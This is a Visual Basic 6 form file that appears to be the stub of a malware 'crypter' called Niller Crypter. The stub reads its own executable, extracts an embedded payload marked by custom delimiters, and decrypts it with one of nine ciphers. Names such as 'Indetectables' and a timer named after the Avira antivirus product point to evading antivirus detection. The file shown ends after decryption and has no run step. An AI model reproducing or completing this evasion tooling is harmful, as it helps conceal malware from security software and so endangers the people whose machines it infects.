VERSION 5.00
Begin VB.Form Windows 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   450
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   465
   LinkTopic       =   "Form1"
   ScaleHeight     =   450
   ScaleWidth      =   465
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer AviraN 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "Windows"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Sub main()
Dim Indetectables As String, Niller As String, Datos2010() As String, Opciones2010() As String, Encriptar As String

Niller = App.Path & App.EXEName & ".exe"

NillerMethod.ArchivoA Niller, Indetectables

Datos2010() = NillerMethod.Dividir(Indetectables, "//Niller'Crypter\\")
Opciones2010() = NillerMethod.Dividir(Indetectables, "//Niller'Opciones\\")

If Datos2010(2) = 1 Then
Dim enc As New clsRC4 'RC4
Encriptar = enc.DecryptString(Datos2010(1), Datos2010(3))
End If

If Datos2010(2) = 2 Then
Dim enc As New clsSimpleXOR 'XOR
Encriptar = enc.DecryptString(Datos2010(1), Datos2010(3))
End If

If Datos2010(2) = 3 Then
Dim enc As New clsSkipjack 'SkipJack
Encriptar = enc.DecryptString(Datos2010(1), Datos2010(3))
End If

If Datos2010(2) = 4 Then
Dim enc As New clsGost 'Gost
Encriptar = enc.DecryptString(Datos2010(1), Datos2010(3))
End If

If Datos2010(2) = 5 Then
Dim enc As New clsCryptAPI 'ClsCryptAPI
Encriptar = enc.DecryptString(Datos2010(1), Datos2010(3))
End If

If Datos2010(2) = 6 Then
Dim enc As New clsDES 'DES
Encriptar = enc.DecryptString(Datos2010(1), Datos2010(3))
End If

If Datos2010(2) = 7 Then
Dim enc As New clsTEA 'TEA
Encriptar = enc.DecryptString(Datos2010(1), Datos2010(3))
End If

If Datos2010(2) = 8 Then
Dim enc As New clsTwofish 'TwoFish
Encriptar = enc.DecryptString(Datos2010(1), Datos2010(3))
End If

If Datos2010(2) = 9 Then
Dim enc As New clsBlowfish 'Blowfish
Encriptar = enc.DecryptString(Datos2010(1), Datos2010(3))
End If

End Sub
